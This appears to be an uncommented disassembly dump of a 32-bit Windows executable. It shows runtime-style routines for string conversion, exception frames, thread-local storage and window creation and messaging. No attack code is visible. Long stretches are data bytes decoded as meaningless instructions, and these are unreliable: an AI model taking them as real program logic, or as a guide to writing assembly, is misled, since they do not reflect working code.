xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405ab0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f20
mov eax ebx
xor edx edx
call sub_404778
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b56
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
call sub_40476c
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_40456c
mov eax ebx
call sub_40476c
push eax
mov eax [ ebp - 0x4 ]
call sub_4041e0
inc eax
push eax
mov eax ebx
call sub_40475c
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
pop ecx
pop edx
call sub_40589c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f20
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40456c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f74
sub_405b5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404600
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bfa
lea eax [ ebp - 0x4 ]
call sub_404600
retn
mov eax ebx
call sub_4041e0
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404848
mov eax ebx
call sub_4041e0
push eax
mov eax [ ebp - 0x4 ]
call sub_40476c
inc eax
push eax
mov eax ebx
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_40475c
pop ecx
pop edx
call sub_405978
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404600
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404848
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40463c
sub_405c00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c43
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40474c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405ab0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c4a
lea eax [ ebp - 0x4 ]
call sub_404600
retn
sub_405c50
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404118
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4051bc
push eax
call sub_4012ac
mov ecx eax
mov edx esp
mov eax esi
call sub_404010
jmp r-xdata
sub_405ca8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405d0e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401274
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404190
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402bc4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d15
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
xor ebx ebx
sub_405d1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d66
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d6d
retn
mov eax rw-data
call sub_402a00
mov eax rw-data
call sub_402a00
mov eax rw-data
call sub_402a00
call sub_401ae0
sub_405d70
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cbc
call sub_402fd0
test al al
je r-xdata
call sub_4030c4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40132c
mov [ rw-data ] eax
call sub_401324
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403000
call sub_40129c
call sub_405ca8
mov [ rw-data ] eax
call sub_401324
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40129c
call sub_405ca8
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40131c
mov [ rw-data ] eax
sub_405e78
push ebx
call sub_405e70
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405e64
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f14
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f14
sub_405ebc
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405e78
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405f08
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e44
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405efc
mov edx rw-data
mov eax ebx
call sub_403c68
pop ebx
retn
sub_405f4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f78
retn
sub_405fa8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405fc4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fe9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ff0
retn
sub_405ffc
add [ eax + 0x40 ] ah
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
cld
pop edi
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
inc edi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
loopne r-xdata
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ebx - 0x2bda0040 ] cl
inc edi
add [ ebx - 0x2fda0040 ] cl
inc edi
add [ ebx - 0x33da0040 ] cl
inc edi
add [ ebx - 0x37da0040 ] cl
inc edi
add [ ebx - 0x3bda0040 ] cl
inc edi
add [ ebx - 0x3fda0040 ] cl
inc edi
add [ ebx - 0x43da0040 ] cl
inc edi
add [ ebx - 0x47da0040 ] cl
inc edi
add [ ebx - 0x4bda0040 ] cl
inc edi
add [ ebx - 0x4fda0040 ] cl
inc edi
add [ ebx - 0x53da0040 ] cl
inc edi
add [ ebx - 0x57da0040 ] cl
inc edi
add [ ebx - 0x5bda0040 ] cl
inc edi
add [ ebx - 0x5fda0040 ] cl
inc edi
add [ ebx - 0x63da0040 ] cl
inc edi
add [ ebx - 0x67da0040 ] cl
inc edi
add [ ebx - 0x6bda0040 ] cl
inc edi
add [ ebx - 0x6fda0040 ] cl
inc edi
add [ ebx - 0x73da0040 ] cl
inc edi
add [ ebx - 0x77da0040 ] cl
inc edi
add [ ebx - 0x7bda0040 ] cl
inc edi
add [ ebx - 0x7fda0040 ] cl
inc edi
add [ ebx + 0x7c25ffc0 ] cl
inc edi
add [ ebx + 0x7825ffc0 ] cl
inc edi
add [ ebx + 0x7425ffc0 ] cl
inc edi
add [ ebx + 0x7025ffc0 ] cl
inc edi
add [ ebx + 0x6c25ffc0 ] cl
inc edi
add [ ebx + 0x6825ffc0 ] cl
inc edi
add [ ebx + 0x6425ffc0 ] cl
inc edi
add [ ebx + 0x6025ffc0 ] cl
inc edi
add [ ebx + 0x5c25ffc0 ] cl
inc edi
add [ ebx + 0x5825ffc0 ] cl
inc edi
add [ ebx + 0x5425ffc0 ] cl
inc edi
add [ ebx + 0x5025ffc0 ] cl
inc edi
add [ ebx + 0x4c25ffc0 ] cl
inc edi
add [ ebx + 0x4825ffc0 ] cl
inc edi
add [ ebx + 0x4425ffc0 ] cl
inc edi
add [ ebx + 0x4025ffc0 ] cl
inc edi
add [ ebx + 0x3c25ffc0 ] cl
inc edi
add [ ebx + 0x3825ffc0 ] cl
inc edi
add [ ebx + 0x3425ffc0 ] cl
inc edi
add [ ebx + 0x3025ffc0 ] cl
inc edi
add [ ebx + 0x2c25ffc0 ] cl
inc edi
add [ ebx + 0x2825ffc0 ] cl
inc edi
add [ ebx + 0x2425ffc0 ] cl
inc edi
add [ ebx + 0x2025ffc0 ] cl
inc edi
add [ ebx + 0x1c25ffc0 ] cl
inc edi
add [ ebx + 0x1825ffc0 ] cl
inc edi
add [ ebx + 0x1425ffc0 ] cl
inc edi
add [ ebx + 0x1025ffc0 ] cl
inc edi
add [ ebx + 0xc25ffc0 ] cl
inc edi
add [ ebx + 0x825ffc0 ] cl
inc edi
add [ ebx + 0x425ffc0 ] cl
inc edi
add [ ebx + 0x25ffc0 ] cl
inc edi
add [ ebx - 0x3da0040 ] cl
int1
inc edi
add [ ebx + 0x425ffc0 ] cl
inc edi
add [ ebx + 0x25ffc0 ] cl
inc edi
add [ ebx - 0x3da0040 ] cl
inc edi
add [ ebx + 0x1c25ffc0 ] cl
hlt
inc edi
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
mov eax eax
add [ ebx - 0x23da0040 ] cl
inc edi
add [ ebx - 0x27da0040 ] cl
inc edi
inc edi
add [ ebx - 0x17da0040 ] cl
add [ ebx - 0xfda0040 ] cl
inc edi
add [ ebx - 0x13da0040 ] cl
inc edi
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
mov al 0x60
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx - 0x1bda0040 ] cl
inc edi
add [ ebx - 0x1fda0040 ] cl
inc edi
mov eax eax
add edi esp
pop edi
inc eax
add [ ebx - 0xbda0040 ] cl
int1
inc edi
add [ ebx - 0xfda0040 ] cl
int1
inc edi
add [ ebx - 0x13da0040 ] cl
int1
inc edi
add [ ebx - 0xbda0040 ] cl
inc edi
sub_406b44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406b9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406ce9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d18
retn
sub_406d24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406d49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d50
retn
sub_406d5c
out 0x47 al
add al dh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax + 0x640000ff ] dh
out 0x47 al
add [ ecx + 0x640000ff ] dh
out 0x47 al
add [ edx + 0x640000ff ] dh
out 0x47 al
add [ ebx + 0x640000ff ] dh
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
out 0x47 al
add [ esi + 0x640000ff ] dh
out 0x47 al
add [ edi + 0x640000ff ] dh
out 0x47 al
add [ eax + 0x640000ff ] bh
out 0x47 al
add [ ecx + 0x640000ff ] bh
out 0x47 al
add [ edx + 0x640000ff ] bh
out 0x47 al
add [ ebx + 0x640000ff ] bh
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
out 0x47 al
add [ esi + 0x640000ff ] bh
out 0x47 al
add [ edi + 0x640000ff ] bh
out 0x47 al
add [ eax + 0x640000ff ] ah
out 0x47 al
add [ ecx + 0x640000ff ] ah
out 0x47 al
add [ edx + 0x640000ff ] ah
out 0x47 al
add [ ebx + 0x640000ff ] ah
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
out 0x47 al
add [ esi + 0x640000ff ] ah
out 0x47 al
add [ edi + 0x640000ff ] ah
out 0x47 al
add [ eax + 0x640000ff ] ch
out 0x47 al
add [ ecx + 0x640000ff ] ch
out 0x47 al
add [ edx + 0x640000ff ] ch
out 0x47 al
add [ ebx + 0x640000ff ] ch
out 0x47 al
add [ edi + edi * 8 - 0x199c0000 ] ch
inc edi
add [ ebp + 0x640000ff ] ch
out 0x47 al
add [ esi + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407079
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407080
retn
sub_407139
mov ecx 0x31800040
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
loopne r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add [ eax ] ch
xor [ eax ] eax
clc
jno r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b218
xor eax [ eax ]
loopne r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0xb004031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
imul ebp [ edi + 0x6e ] 0x40719c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] bl
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004072 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b270
xor eax [ eax ]
loopne r-xdata
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] dl
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x72
inc eax
add [ eax ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x40 ] dh
popad
insb
mov eax eax
test al 0x72
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004073 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] ah
inc eax
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
inc ebp
inc ebp
js r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0x9004031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
mov eax 0x4073
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 + 0x33d80040 ] bh
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b380
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 + 0x33d80040 ] bh
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b430
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ edx + esi * 2 + 0x33d80040 ] bh
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b3d8
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10004073
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jae r-xdata
imul ebp [ edi + 0x6e ] 0x40730890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
